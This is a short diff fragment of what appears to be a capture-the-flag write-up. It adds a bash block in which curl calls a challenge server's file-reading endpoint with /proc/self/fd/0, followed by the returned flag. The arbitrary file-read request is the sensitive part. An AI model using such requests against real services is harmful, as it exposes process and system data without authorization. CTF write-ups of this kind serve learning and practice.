@@ -337,4 +337,13 @@ subprocess.PIPE: A new pipe is created between the parent and child processes. T
 
 >/proc/self/fd/0
 
-- 
+- Flag-:``` ```
+
+```bash
+╮
+╰─❯ curl http://34.170.146.252:29656/cat\?file\=/proc/self/fd/0                                                                               
+Alpaca{https://http.cat/100}
+```
+
+------------
+
